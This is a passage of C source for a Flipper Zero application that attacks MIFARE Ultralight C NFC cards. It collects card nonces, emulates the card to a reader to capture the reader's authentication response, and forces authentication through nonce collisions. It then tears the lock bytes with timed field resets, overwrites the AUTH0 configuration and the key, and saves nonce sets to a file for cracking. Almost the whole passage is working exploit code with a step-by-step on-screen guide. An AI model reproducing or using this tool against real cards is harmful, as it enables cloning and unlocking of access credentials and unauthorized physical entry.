                FURI_LOG_E(TAG, "Tx error");
            }
        } else if(data_len == 17 && data[0] == 0xAF) {
            FURI_LOG_I(TAG, "Received AUTH2 response from reader");
            app->auth2_received = true;
            // Also happens to be the 100 nonce, but its a cleaner implementation to just use the card nonce
            memcpy(app->common_nonce_response, data + 1, 16);
        }
    }
    return command;
}

static NfcDevice* ultralight_c_nfc_device_alloc(const uint8_t uid[]) {
    const uint8_t atqa[] = {0x44, 0x00};

    Iso14443_3aData* iso14443_3a_edit_data = iso14443_3a_alloc();
    iso14443_3a_set_uid(iso14443_3a_edit_data, uid, 7);
    iso14443_3a_set_sak(iso14443_3a_edit_data, 0);
    iso14443_3a_set_atqa(iso14443_3a_edit_data, atqa);

    NfcDevice* nfc_device = nfc_device_alloc();
    nfc_device_set_data(nfc_device, NfcProtocolIso14443_3a, iso14443_3a_edit_data);

    iso14443_3a_free(iso14443_3a_edit_data);
    return nfc_device;
}

static void do_shutdown(AppContext* app) {
    if(app->field_active) {
        // Turn off NFC field
        furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
        disable_nfc_field(&furi_hal_spi_bus_handle_nfc);
        furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
        app->field_active = false;
    }
    if(app->emulate_active) {
        // Turn off emulation
        nfc_listener_stop(app->listener);
        nfc_listener_free(app->listener);
        nfc_free(app->nfc);
        nfc_device_free(app->device);
        app->emulate_active = false;
    }
    notification_message(app->notifications, &sequence_blink_stop);
}

static void
    append_bytes_to_string(FuriString* str, const char* prefix, uint8_t* bytes, size_t len) {
    furi_string_cat_printf(str, " %s ", prefix);
    for(size_t i = 0; i < len; i++) {
        furi_string_cat_printf(str, "%02x", bytes[i]);
    }
}

static bool save_nonces_to_file(AppContext* app) {
    // Save the nonces stored in app->nonce_100, app->nonce_75, app->nonce_50, app->nonce_25 to MF_ULCF_NONCE_PATH, appending a line
    Storage* storage = furi_record_open(RECORD_STORAGE);
    Stream* stream = buffered_file_stream_alloc(storage);
    FuriString* nonce_string = furi_string_alloc();
    bool params_write_success = true;

    do {
        if(!buffered_file_stream_open(stream, MF_ULCF_NONCE_PATH, FSAM_WRITE, FSOM_OPEN_APPEND))
            break;
        // Add UID (skipping first byte based on original code)
        furi_string_cat_printf(nonce_string, "cuid ");
        for(size_t i = 1; i < 8; i++) {
            furi_string_cat_printf(nonce_string, "%02x", app->uid[i]);
        }

        // Add nonces
        append_bytes_to_string(nonce_string, "nt100", app->nonce_100, 8);
        append_bytes_to_string(nonce_string, "nt75", app->nonce_75, 8);
        append_bytes_to_string(nonce_string, "nt50", app->nonce_50, 8);
        append_bytes_to_string(nonce_string, "nt25", app->nonce_25, 8);

        furi_string_cat_printf(nonce_string, "\n");

        FURI_LOG_D(TAG, "Writing nonces to file: %s", furi_string_get_cstr(nonce_string));

        if(!stream_write_string(stream, nonce_string)) {
            params_write_success = false;
            break;
        }
    } while(false);

    furi_string_free(nonce_string);
    buffered_file_stream_close(stream);
    stream_free(stream);
    furi_record_close(RECORD_STORAGE);

    return params_write_success;
}

int32_t ulcfkey_app(void* p) {
    // TODO: Zero values when back button is pressed
    UNUSED(p);

    // Allocate app context
    AppContext* app = malloc(sizeof(AppContext));
    memset(app, 0, sizeof(AppContext));
    app->state = AppStateMain;
    app->event_queue = furi_message_queue_alloc(8, sizeof(AppEvent));
    app->nfc_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->data = malloc(sizeof(AppData));
    app->data->message = furi_string_alloc();
    app->data->message_received = false;
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->help_state = malloc(sizeof(HelpState));
    app->help_state->scroll_pos = 0;
    // Calculate number of scroll positions based on total text height
    app->help_state->scroll_num = 7; // Adjust based on number of visible lines needed
    app->tear_delay = TEAR_DELAY_US;
    app->help_state->text = furi_string_alloc_set("Place Flipper against\n"
                                                  "card and press Collect NT.\n"
                                                  "\n"
                                                  "Next, bring Flipper\n"
                                                  "to reader and press\n"
                                                  "Collect NR.\n"
                                                  "\n"
                                                  "Last, place Flipper\n"
                                                  "against card and press\n"
                                                  "Crack.");

    // GUI
    app->gui = furi_record_open(RECORD_GUI);
    app->view_port = view_port_alloc();
    view_port_draw_callback_set(app->view_port, render_callback, app);
    view_port_input_callback_set(app->view_port, input_callback, app);
    gui_add_view_port(app->gui, app->view_port, GuiLayerFullscreen);

    bool running = true;
    AppEvent event;

    while(running) {
        FuriStatus status = furi_message_queue_get(app->event_queue, &event, 100);

        if(status == FuriStatusOk) {
            if(event.type == EventTypeKey &&
               (event.input.type == InputTypeShort ||
                (app->state == AppStateHelp && event.input.type == InputTypeRepeat))) {
                // Handle states
                if(app->state == AppStateMain) {
                    // Main screen
                    switch(event.input.key) {
                    case InputKeyBack:
                        running = false;
                        break;
                    case InputKeyOk:
                        app->state = AppStateCollectNTReady;
                        break;
                    case InputKeyRight:
                        app->state = AppStateHelp;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateHelp) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    case InputKeyUp:
                        if(app->help_state->scroll_pos > 0) {
                            app->help_state->scroll_pos--;
                        }
                        break;
                    case InputKeyDown:
                        if(app->help_state->scroll_pos < app->help_state->scroll_num - 1) {
                            app->help_state->scroll_pos++;
                        }
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCollectNTReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCollectNTInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCollectNRReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCollectNRInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCollectNTInit ||
                    app->state == AppStateCollectNTWaiting) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        if(app->state == AppStateCollectNTWaiting) {
                            do_shutdown(app);
                        }
                        app->state = AppStateCollectNTReady;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCollectNRInit ||
                    app->state == AppStateCollectNRWaiting) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        if(app->state == AppStateCollectNRWaiting) {
                            do_shutdown(app);
                        }
                        app->state = AppStateCollectNRReady;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateCrackReady) {
                    switch(event.input.key) {
                    case InputKeyOk:
                        app->state = AppStateCrackInit;
                        break;
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(
                    app->state == AppStateCrackInit || app->state == AppStateCrackInitialAuth ||
                    app->state == AppStateCrackTearLockbytes ||
                    app->state == AppStateCrackOverwriteAuth0 ||
                    app->state == AppStateCrackCollectNonces) {
                    switch(event.input.key) {
                    // TODO: Warn user that the key will be lost
                    // TODO: Some method of returning to this stage from the main screen, saved nonces
                    case InputKeyBack:
                        do_shutdown(app);
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateComplete) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
                        do_shutdown(app);
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                } else if(app->state == AppStateError) {
                    switch(event.input.key) {
                    case InputKeyBack:
                        app->state = AppStateMain;
                        break;
                    default:
                        break;
                    }
                }
            }
        }
        // Ongoing tasks
        if(app->state == AppStateCollectNTInit) {
            // Enable NFC, initialize_card, etc.
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            app->state = AppStateCollectNTWaiting;
        } else if(app->state == AppStateCollectNTWaiting) {
            // Collect auth1 challenges up to MAX_NONCES and store in app context
            if(app->total_nonces < MAX_NONCES) {
                if(collect_auth1_challenge(&furi_hal_spi_bus_handle_nfc, app, false)) {
                    FURI_LOG_I(TAG, "Collected nonce %lu/%u", app->total_nonces, MAX_NONCES);
                    FURI_LOG_I(TAG, "Unique nonces: %u", app->unique_nonces);
                } else {
                    FURI_LOG_E(TAG, "Init card fail, retrying...");
                }
            } else {
                // We have collected enough nonces, move to next state
                notification_message(app->notifications, &sequence_blink_stop);
                FURI_LOG_I(TAG, "Nonce collection complete");
                // Make sure there are at least 2 duplicate nonces for at least one nonce, using .count. If all nonces have only 1 count, we need to error.
                bool found_duplicate = false;
                uint8_t highest_common_nonce_count = 0;
                for(uint16_t i = 0; i < app->unique_nonces; i++) {
                    if(app->nonces[i].count > 1) {
                        if(!found_duplicate) {
                            found_duplicate = true;
                        }
                        if(app->nonces[i].count > highest_common_nonce_count) {
                            highest_common_nonce_count = app->nonces[i].count;
                            memcpy(app->common_nonce, app->nonces[i].nonce, 8);
                        }
                    }
                }
                if(!found_duplicate) {
                    app->state = AppStateError;
                    app->error = "PRNG not predictable";
                    notification_message(app->notifications, &sequence_error);
                } else {
                    FURI_LOG_I(TAG, "Highest common nonce count: %u", highest_common_nonce_count);
                    app->state = AppStateCollectNRReady;
                    notification_message(app->notifications, &sequence_success);
                }
                furi_hal_spi_release(&furi_hal_spi_bus_handle_nfc);
                do_shutdown(app);
            }
        } else if(app->state == AppStateCollectNRInit) {
            // Set up emulated card
            notification_message(app->notifications, &sequence_blink_start_blue);
            // Create an NFC listener using the iso14443_3a listener
            app->nfc = nfc_alloc();
            app->device = ultralight_c_nfc_device_alloc(app->uid + 1);
            NfcProtocol protocol = nfc_device_get_protocol(app->device);
            FURI_LOG_I(TAG, "NFC: Protocol %s", nfc_device_get_protocol_name(protocol));
            app->listener =
                nfc_listener_alloc(app->nfc, protocol, nfc_device_get_data(app->device, protocol));
            FURI_LOG_I(TAG, "NFC: Starting...");
            nfc_listener_start(app->listener, ulcfkey_listener_callback, app);
            app->emulate_active = true;
            app->state = AppStateCollectNRWaiting;
        } else if(app->state == AppStateCollectNRWaiting) {
            // Collect NR
            if(app->auth2_received) {
                do_shutdown(app);
                app->state = AppStateCrackReady;
            }
        } else if(app->state == AppStateCrackInit) {
            // Enable NFC, initialize_card, etc.
            notification_message(app->notifications, &sequence_blink_start_cyan);
            furi_hal_spi_acquire(&furi_hal_spi_bus_handle_nfc);
            setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
            app->field_active = true;
            app->state = AppStateCrackInitialAuth;
        } else if(app->state == AppStateCrackInitialAuth) {
            // Attempt to auth with the common nonce
            if(attempt_auth_with_nonce_collision(&furi_hal_spi_bus_handle_nfc, app)) {
                app->state = AppStateCrackTearLockbytes;
            }
        } else if(app->state == AppStateCrackTearLockbytes) {
            // Tear the lock bytes. Only if needed, read the lock bytes first.
            if(attempt_tear_lockbytes(&furi_hal_spi_bus_handle_nfc, app)) {
                app->state = AppStateCrackOverwriteAuth0;
            } else {
                // Auth reset
                app->tear_delay++;
                setup_nfc_field(&furi_hal_spi_bus_handle_nfc);
                app->field_active = true;
                app->state = AppStateCrackInitialAuth;
            }
        } else if(app->state == AppStateCrackOverwriteAuth0) {
            // Overwrite AUTH0 to 30
            if(overwrite_auth0_config(&furi_hal_spi_bus_handle_nfc, app)) {
                FURI_LOG_I(TAG, "Card unlocked");
                app->state = AppStateCrackCollectNonces;
            } else {
                app->state = AppStateError;
                app->error = "Failed to overwrite AUTH0";
                notification_message(app->notifications, &sequence_error);
            }
        } else if(app->state == AppStateCrackCollectNonces) {
            // Overwrite the key and collect 100, 75, 50, 25 nonces
            if(collect_nonces(&furi_hal_spi_bus_handle_nfc, app)) {
                save_nonces_to_file(app);
                app->state = AppStateComplete;
                notification_message(app->notifications, &sequence_blink_stop);
                notification_message(app->notifications, &sequence_success);
            } else {
                app->state = AppStateError;
                app->error = "Failed to collect nonces";
                notification_message(app->notifications, &sequence_error);
            }
        }

        view_port_update(app->view_port);
    }

    view_port_enabled_set(app->view_port, false);
    gui_remove_view_port(app->gui, app->view_port);
    view_port_free(app->view_port);
    furi_record_close(RECORD_GUI);

    furi_string_free(app->data->message);
    free(app->data);
    furi_message_queue_free(app->event_queue);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->nfc_mutex);

    free(app);
    return 0;
}

#pragma GCC diagnostic pop